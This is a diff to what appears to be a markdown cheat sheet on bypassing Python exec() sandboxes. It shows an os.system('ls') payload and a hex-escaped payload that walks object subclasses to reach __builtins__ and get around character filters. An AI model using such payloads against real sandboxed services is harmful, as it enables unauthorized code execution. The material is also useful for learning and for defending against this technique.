@@ -5,7 +5,7 @@
 * We can encode forbidden characters in their encoded form. Here we used hex encoded as it works smoothly as compared to octal encoding.
 * Target command
   * `exec("print('RCE'); __import__('os').system('ls')")`
-* Updated command, after converting payload to octal
+* Updated command, after converting payload to hex bypte code
   * `exec("\x5bi for i in \x28)\x2e\x5f\x5fclass\x5f\x5f\x2e\x5f\x5fbases\x5f\x5f\x5b0]\x2e\x5f\x5fsubclasses\x5f\x5f\x28) if i\x2e\x5f\x5fname\x5f\x5f=='catch\x5fwarnings']\x5b0]\x28)\x2e\x5fmodule\x2e\x5f\x5fbuiltins\x5f\x5f")`
 
 ## Alternative.to commands
